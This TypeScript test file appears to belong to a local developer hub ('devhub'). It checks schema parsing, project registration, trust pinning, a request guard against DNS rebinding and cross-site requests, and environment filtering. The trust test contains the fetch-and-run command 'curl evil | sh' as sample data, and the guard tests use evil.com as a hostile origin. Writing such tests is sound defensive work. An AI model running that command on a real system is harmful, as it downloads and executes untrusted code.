import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { beforeEach, describe, expect, it } from "vitest";
import YAML from "yaml";
import {
	addProjectRoot,
	loadProject,
	loadProjects,
	scaffoldProject,
} from "#/server/registry";
import { projectFileSchema } from "#/server/schema";
import { isAllowedRequest } from "#/server/security";
import { isTrusted, trust } from "#/server/trust";

describe("project file schema", () => {
	it.each([
		"examples/fitbase/.dev/project.yaml",
		"examples/demo-app/.dev/project.yaml",
	])("accepts %s", (file) => {
		const parsed = projectFileSchema.safeParse(
			YAML.parse(fs.readFileSync(file, "utf8")),
		);
		expect(parsed.error?.issues ?? []).toEqual([]);
	});

	it("normalizes string commands", () => {
		const parsed = projectFileSchema.parse({
			name: "x",
			commands: { start: "npm run dev" },
		});
		expect(parsed.commands?.start).toEqual({ command: "npm run dev" });
	});
});

describe("registry", () => {
	let home: string;
	beforeEach(() => {
		home = fs.mkdtempSync(path.join(os.tmpdir(), "devhub-home-"));
		process.env.DEVHUB_HOME = home;
	});

	it("registers, scaffolds and reports invalid projects without throwing", async () => {
		const repo = fs.mkdtempSync(path.join(os.tmpdir(), "devhub-repo-"));
		await scaffoldProject(repo, 5173);
		const project = await loadProject(repo);
		expect(project.ok).toBe(true);
		if (project.ok)
			expect(project.config.services?.web?.url).toBe("http://localhost:5173");

		const broken = fs.mkdtempSync(path.join(os.tmpdir(), "devhub-broken-"));
		fs.mkdirSync(path.join(broken, ".dev"));
		fs.writeFileSync(
			path.join(broken, ".dev/project.yaml"),
			"description: no name\n",
		);
		await addProjectRoot(broken);

		const all = await loadProjects();
		expect(all).toHaveLength(2);
		expect(all.find((p) => p.root === broken)).toMatchObject({ ok: false });
	});

	it("pins trust to the commands", async () => {
		const config = projectFileSchema.parse({
			name: "x",
			commands: { start: "npm run dev" },
		});
		expect(await isTrusted("/repo", config)).toBe(false);
		await trust("/repo", config);
		expect(await isTrusted("/repo", config)).toBe(true);
		const changed = projectFileSchema.parse({
			name: "x",
			commands: { start: "curl evil | sh" },
		});
		expect(await isTrusted("/repo", changed)).toBe(false);
	});
});

describe("request guard", () => {
	const h = (init: Record<string, string>) => new Headers(init);

	it("allows same-origin loopback requests", () => {
		expect(isAllowedRequest(h({ host: "localhost:6969" }), "GET")).toBeNull();
		expect(
			isAllowedRequest(
				h({
					host: "devhub.localhost:6969",
					origin: "http://devhub.localhost:6969",
				}),
				"POST",
			),
		).toBeNull();
		expect(
			isAllowedRequest(
				h({ host: "127.0.0.1:6969", "sec-fetch-site": "same-origin" }),
				"POST",
			),
		).toBeNull();
	});

	it("blocks DNS rebinding", () => {
		expect(isAllowedRequest(h({ host: "evil.com:6969" }), "GET")).toMatch(
			/Host/,
		);
	});

	it("blocks cross-site requests", () => {
		expect(
			isAllowedRequest(
				h({ host: "localhost:6969", origin: "https://evil.com" }),
				"POST",
			),
		).toMatch(/Origin/);
		expect(
			isAllowedRequest(
				h({
					host: "localhost:6969",
					"sec-fetch-site": "cross-site",
					"sec-fetch-mode": "no-cors",
				}),
				"GET",
			),
		).toMatch(/Cross-site/);
		expect(
			isAllowedRequest(h({ host: "localhost:6969", origin: "null" }), "POST"),
		).toMatch(/Opaque/);
	});

	it("allows top-level navigation from other sites (e.g. a bookmark)", () => {
		expect(
			isAllowedRequest(
				h({
					host: "localhost:6969",
					"sec-fetch-site": "cross-site",
					"sec-fetch-mode": "navigate",
				}),
				"GET",
			),
		).toBeNull();
	});
});

describe("command environment", () => {
	it("drops the hub's own server settings", async () => {
		const { withoutHubEnv } = await import("#/server/runner");
		const env = withoutHubEnv({
			PORT: "6969",
			HOST: "127.0.0.1",
			NODE_ENV: "production",
			NITRO_PORT: "6969",
			npm_lifecycle_event: "start",
			PATH: "/usr/bin",
			DEVHUB_HOME: "/x",
		});
		expect(env).toEqual({ PATH: "/usr/bin", DEVHUB_HOME: "/x" });
	});
});
